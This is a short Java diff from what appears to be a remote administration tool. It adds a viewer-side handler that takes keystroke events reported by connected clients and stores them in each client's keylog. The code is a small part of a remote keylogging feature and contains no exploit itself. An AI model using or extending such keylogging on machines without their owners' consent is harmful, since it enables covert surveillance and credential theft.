@@ -23,6 +23,7 @@ import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.util.CUtil;
+import com.subterranean_security.crimson.sv.ClientProfile;
 import com.subterranean_security.crimson.viewer.ViewerStore;
 
 import io.netty.util.ReferenceCountUtil;
@@ -51,6 +52,8 @@ public class ViewerExecutor extends BasicExecutor {
 						ViewerStore.Profiles.update(m.getEvServerProfileDelta());
 					} else if (m.hasEvViewerProfileDelta()) {
 						ViewerStore.Profiles.update(m.getEvViewerProfileDelta());
+					} else if (m.hasEvKevent()) {
+						ev_kevent(m);
 					}
 					ReferenceCountUtil.release(m);
 				}
@@ -83,6 +86,15 @@ public class ViewerExecutor extends BasicExecutor {
 		Common.cvid = m.getMiAssignCvid().getId();
 		ViewerStore.Databases.local.storeObject("cvid", Common.cvid);
 		log.debug("Assigned new CVID: {}", Common.cvid);
+	}
+
+	private void ev_kevent(Message m) {
+		ClientProfile cp = ViewerStore.Profiles.getClient(m.getSid());
+		if (cp != null) {
+			cp.getKeylog().addEvent(m.getEvKevent());
+		} else {
+			log.debug("Failed to find client: " + m.getSid());
+		}
 	}
 
 }
